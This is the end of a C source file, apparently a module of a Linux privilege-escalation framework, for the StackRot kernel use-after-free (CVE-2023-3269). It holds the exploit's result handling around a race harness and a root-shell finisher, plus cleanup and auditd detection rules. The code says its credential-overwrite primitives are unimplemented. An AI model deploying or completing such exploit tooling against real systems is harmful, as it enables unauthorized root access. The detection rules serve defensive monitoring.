    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        if (!ctx->json) {
            fprintf(stderr, "[!] stackrot: race child killed by signal %d "
                            "(consistent with UAF firing under KASAN)\n", sig);
            fprintf(stderr, "[~] stackrot: empirical signal recorded; no cred\n"
                            "    overwrite primitive — NOT claiming EXPLOIT_OK.\n"
                            "    See /tmp/skeletonkey-stackrot.log + dmesg for witnesses.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] stackrot: child terminated abnormally (status=0x%x)\n",
                status);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 22 || rc == 24) return SKELETONKEY_PRECOND_FAIL;
    if (rc == 23) return SKELETONKEY_EXPLOIT_FAIL;

    if (rc == 34) {
        /* Finisher reported root-pop success. The shared finisher
         * normally execve()s the root shell so we don't actually
         * reach this path unless --no-shell was set. */
        if (!ctx->json) {
            fprintf(stderr, "[+] stackrot: --full-chain finisher reported "
                            "EXPLOIT_OK (race won + write landed)\n");
        }
        return SKELETONKEY_EXPLOIT_OK;
    }
    if (rc == 35) {
        /* Finisher ran but didn't land — by far the expected outcome
         * given the <1 % race-win rate. */
        if (!ctx->json) {
            fprintf(stderr, "[~] stackrot: --full-chain finisher ran; race did not\n"
                            "    win + land within budget (this is the expected\n"
                            "    outcome — race-win reliability is <1%% per run).\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (rc != 30) {
        fprintf(stderr, "[-] stackrot: child failed at stage rc=%d\n", rc);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[*] stackrot: race harness ran to completion.\n");
        fprintf(stderr, "[~] stackrot: read/write/cred-overwrite primitives NOT\n"
                        "    implemented (per-kernel offsets; see module .c TODO\n"
                        "    blocks). Returning EXPLOIT_FAIL per verified-vs-claimed.\n");
    }
    return SKELETONKEY_EXPLOIT_FAIL;
}

#endif /* __linux__ */

static skeletonkey_result_t stackrot_exploit(const struct skeletonkey_ctx *ctx)
{
#ifdef __linux__
    return stackrot_exploit_linux(ctx);
#else
    (void)ctx;
    fprintf(stderr, "[-] stackrot: Linux-only module; cannot run on this host\n");
    return SKELETONKEY_PRECOND_FAIL;
#endif
}

/* ---- Cleanup ----------------------------------------------------- */

static skeletonkey_result_t stackrot_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] stackrot: cleaning up race-harness breadcrumb\n");
    }
    if (unlink("/tmp/skeletonkey-stackrot.log") < 0 && errno != ENOENT) {
        /* harmless */
    }
    /* The race harness's threads + msg queues live in the child
     * process which has already exited; nothing else to drain. */
    return SKELETONKEY_OK;
}

/* ---- Detection rules --------------------------------------------- */

static const char stackrot_auditd[] =
    "# StackRot (CVE-2023-3269) — auditd detection rules\n"
    "# The trigger is mremap/munmap/mprotect bursts against MAP_GROWSDOWN\n"
    "# stacks, combined with unshare(CLONE_NEWUSER). Each individual call\n"
    "# is benign — flag the *combination* by correlating these keys with a\n"
    "# subsequent kernel oops or KASAN message in dmesg.\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-stackrot-userns\n"
    "-a always,exit -F arch=b64 -S mremap  -k skeletonkey-stackrot-mremap\n"
    "-a always,exit -F arch=b64 -S mprotect -k skeletonkey-stackrot-mprotect\n"
    "-a always,exit -F arch=b64 -S munmap  -F success=1 -k skeletonkey-stackrot-munmap\n";

const struct skeletonkey_module stackrot_module = {
    .name           = "stackrot",
    .cve            = "CVE-2023-3269",
    .summary        = "maple-tree VMA-split UAF (StackRot) → kernel R/W → cred overwrite",
    .family         = "stackrot",
    .kernel_range   = "6.1 ≤ K < 6.4-rc4, backports: 6.3.10 / 6.1.37 (LTS)",
    .detect         = stackrot_detect,
    .exploit        = stackrot_exploit,
    .mitigate       = NULL,
    .cleanup        = stackrot_cleanup,
    .detect_auditd  = stackrot_auditd,
    .detect_sigma   = NULL,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_stackrot(void)
{
    skeletonkey_register(&stackrot_module);
}
